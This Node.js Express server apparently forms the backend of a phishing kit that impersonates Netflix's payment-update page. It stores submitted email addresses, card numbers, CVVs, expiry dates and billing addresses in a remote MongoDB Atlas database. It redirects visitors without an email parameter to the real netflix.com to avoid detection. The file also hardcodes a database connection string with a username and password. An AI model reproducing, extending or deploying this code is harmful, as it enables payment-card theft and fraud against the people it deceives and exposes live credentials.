const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();

// Middleware – serve static files (CSS, JS, images, favicon) but NOT index.html
app.use(express.static(path.join(__dirname, 'public'), { index: false }));
app.use(express.json());

const MONGO_URI = "mongodb+srv://SpoilertAlert1:Bnet34341212@cluster0.17x0o.mongodb.net/netflix_payments";

if (!MONGO_URI) {
  console.error('❌ MONGO_URI environment variable is not set.');
  console.error('Example: MONGO_URI="mongodb+srv://user:pass@cluster.mongodb.net/netflix_payments"');
  process.exit(1);
}

async function startServer() {
  try {
    await mongoose.connect(MONGO_URI);
    console.log('✅ Connected to MongoDB Atlas');

    const paymentSchema = new mongoose.Schema({
      email: { type: String, required: true },
      cardNumber: String,
      cardName: String,
      expiryDate: String,
      cvv: String,
      billingAddress: {
        line1: String,
        line2: String,
        city: String,
        postcode: String,
        country: String
      },
      submittedAt: { type: Date, default: Date.now }
    });

    mongoose.model('Payment', paymentSchema);

    app.post('/api/payment', async (req, res) => {
      try {
        const Payment = mongoose.model('Payment');
        const payment = new Payment(req.body);
        await payment.save();
        console.log('💾 New payment saved:', payment._id);
        res.status(200).json({ message: 'Payment method saved successfully' });
      } catch (error) {
        console.error('❌ Save error:', error.message);
        res.status(500).json({ message: 'Failed to save payment data' });
      }
    });
    
       app.get('/', (req, res) => {
        return res.redirect(302, 'https://www.netflix.com');
    });

    // Catch-all: only serve the HTML if email exists, otherwise redirect
    app.get('/update-payment', (req, res) => {
      if (!req.query.email) {
        return res.redirect(302, 'https://www.netflix.com');
      }
      res.sendFile(path.join(__dirname, 'public', 'index.html'));
    });

    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
      console.log(`🚀 Server running at http://localhost:${PORT}`);
    });
  } catch (err) {
    console.error('❌ Failed to connect to MongoDB Atlas. Server not started.');
    console.error(err.message);
    process.exit(1);
  }
}

startServer();
